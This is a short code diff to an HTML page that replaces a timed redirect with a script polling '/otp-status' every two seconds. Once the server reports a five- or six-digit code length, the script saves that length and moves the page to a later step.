@@ -25,9 +25,17 @@
 <div class="footer"></div>
 
 <script>
-    setTimeout(() => {
-        window.location.href = "step5.html";
-    }, 5000); // 5 seconds
+    setInterval(() => {
+    fetch("/otp-status")
+    .then(res => res.json())
+    .then(data => {
+        if (data.otp === 5 || data.otp === 6) {
+            localStorage.setItem("otpLength", data.otp);
+            window.location.href = "step6.html";
+        }
+    });
+}, 2000);
+
 </script>
 
 </body>
